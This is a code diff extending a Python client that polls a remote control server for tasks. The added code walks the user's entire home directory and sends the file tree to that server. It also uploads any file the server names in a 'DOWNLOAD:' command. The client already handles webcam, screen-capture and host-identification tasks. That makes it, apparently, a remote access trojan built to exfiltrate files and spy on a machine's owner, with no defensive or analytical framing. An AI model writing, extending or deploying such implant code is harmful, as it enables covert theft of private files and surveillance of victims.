@@ -60,7 +60,55 @@ class Agent():
         )
 
     def get_files(self):
-        pass
+        root_path = os.path.expanduser("~")
+        tree = self._build_tree(root_path)
+        try:
+            requests.post(
+                self.pointurl + "/files",
+                json={"id": self.id, "tree": tree},
+                timeout=60
+            )
+        except Exception as e:
+            print(f"[-] Failed to send file tree: {e}")
+
+    def _build_tree(self, path):
+        name = os.path.basename(path) or path
+        node = {"name": name, "path": path, "type": "dir", "children": []}
+        try:
+            entries = sorted(
+                os.scandir(path),
+                key=lambda e: (not e.is_dir(follow_symlinks=False), e.name.lower())
+            )
+            for entry in entries:
+                if entry.is_dir(follow_symlinks=False):
+                    node["children"].append(self._build_tree(entry.path))
+                else:
+                    try:
+                        size = entry.stat().st_size
+                    except OSError:
+                        size = 0
+                    node["children"].append({
+                        "name": entry.name,
+                        "path": entry.path,
+                        "type": "file",
+                        "size": size
+                    })
+        except (PermissionError, OSError):
+            pass
+        return node
+
+    def download_file(self, path):
+        try:
+            with open(path, "rb") as f:
+                data = f.read()
+            requests.post(
+                self.pointurl + "/download",
+                files={"file": (os.path.basename(path), data, "application/octet-stream")},
+                data={"id": self.id},
+                timeout=60
+            )
+        except Exception as e:
+            print(f"[-] Download failed: {e}")
 
     
 me = Agent()
@@ -113,6 +161,7 @@ def task_check(url):
         task = data.get("task")
         if task == "NONE": return False
         elif task == "FILES": me.get_files()
+        elif task.startswith("DOWNLOAD:"): me.download_file(task[len("DOWNLOAD:"):])
         elif task == "WEBCAM": me.get_webcam()
         elif task == "SCREEN": me.get_screen()
         elif task == "WHO": connect(url)
